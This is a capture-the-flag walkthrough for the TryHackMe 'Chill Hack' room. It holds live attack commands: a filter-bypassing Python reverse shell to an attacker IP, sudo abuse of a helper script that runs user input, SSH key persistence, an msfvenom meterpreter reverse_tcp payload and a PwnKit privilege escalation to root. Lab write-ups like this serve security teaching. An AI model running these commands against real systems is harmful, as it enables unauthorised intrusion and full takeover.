---
title: Walkthrough - Chill Hack
published: true
---

Chill the Hack out of the Machine.

[https://tryhackme.com/room/chillhack](https://tryhackme.com/room/chillhack)

* * *

## Notes

- nmap scan

```shell
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.2.127.225
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Game Info
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

- ftp allowed anonymous login and we can get a note.

```shell
─(0xskar㉿cocokali)-[~/Documents/TryHackMe/Chill-Hack]
└─$ cat note.txt          
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

- gobuster scan we find ``/secret/``
- ``/secret/`` lets us execute commands on the machine
- but as the note in the FTP said, it is filtering some strings. maybe we can bypass this some way.

- ``uname -a`` ``Linux ubuntu 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux``
- tried wget a php rev shell and it uploads but cant tell where...
- looks like we can use find so we can setup netcat and reverse shell by using ``find /usr/bin/python3 -exec {} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.127.225",6669));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' \;``

- upgrade shell ``python3 -c 'import pty;pty.spawn("/bin/bash")'``

- sudo -l give us the following:

```shell
$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

- .helpline.sh

```sh
Welcome to helpdesk. Feel free to talk to anyone at any time!

!/bin/sh

Thank you for your precious time!
$ cat ./.helpline.sh
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

- so user apaar can run this script as sudo
- ``sudo -u apaar /home/apaar/.helpline.sh``
- then ``/bin/bash`` to open up a terminal as apaar

- generate ssh key and add it to the authorized key file in apaars .ssh to open up ssh connection for better terminal
- uname -a we have x86 linux so generate meterpreter.elf
- ``msfvenom -p linux/x86/meterpreter/reverse_tcp  LHOST=10.2.127.225 LPORT=5555 -f elf > meterpreter.elf`` and wget to target and open up ``msfconsole`` and multi-handler listener

* * * 

## What is the user flag?

- upgrade terminal and cat local.txt for user flag

* * * 

## What is the root flag?

- ``linux/local/cve_2021_4034_pwnkit_lpe_pkexec`` will give us root
- cat proof.txt in /root/

* * * 

